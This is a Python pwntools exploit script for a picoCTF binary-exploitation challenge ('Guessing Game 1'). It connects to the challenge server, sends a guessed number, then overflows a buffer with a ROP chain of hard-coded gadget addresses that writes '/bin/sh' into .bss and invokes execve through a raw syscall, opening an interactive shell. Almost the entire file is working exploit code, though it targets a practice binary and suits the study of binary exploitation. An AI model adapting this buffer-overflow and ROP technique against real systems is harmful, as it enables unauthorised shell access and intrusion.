import pwn

# p = pwn.process('./vuln')
# p = pwn.remote("localhost", 8080)
p = pwn.remote("jupiter.challenges.picoctf.org", 38467)
p.readuntil('What number would you like to guess?')
p.sendline(b"84")
offset = 0x78
junk = b'A'*offset
main = 0x00400c8c
rand_func = 0x0045bc0f

bss = 0x6bc3a0
pop_rax = 0x4163f4 # pop rax ; ret
pop_rdi = 0x400696 # pop rdi ; ret
pop_rsi = 0x410ca3 # pop rsi ; ret
pop_rdx = 0x44a6b5 # pop rdx ; ret
rsi_to_rdi_p = 0x447d7b # mov qword ptr [rdi], rsi ; ret
syscall = 0x40137c # syscall


pyload = [
    junk,
    pwn.p64(pop_rsi), # pop rsi ; ret
    pwn.p64(bss), # bss address
    pwn.p64(pop_rdi), # pop rdi ; ret
    pwn.p64(bss), # bss address
    pwn.p64(pop_rsi), # pop rsi ; ret
    b"/bin/sh\x00",
    pwn.p64(rsi_to_rdi_p), # mov qword ptr [rdi], rsi ; ret
    # clear rsi and rdx
    pwn.p64(pop_rsi), # pop rsi ; ret
    pwn.p64(0),
    pwn.p64(pop_rdx), # pop rsi ; ret
    pwn.p64(0),
    pwn.p64(pop_rax),
    pwn.p64(0x3b),
    pwn.p64(syscall)
]
# path = "/home/dolby/repositories/crackme_challenges/Guessing_Game_1/buff"
# with open(path, 'wb') as file:
#     file.write(b"".join(pyload))
p.sendline(b"".join(pyload))
p.interactive()
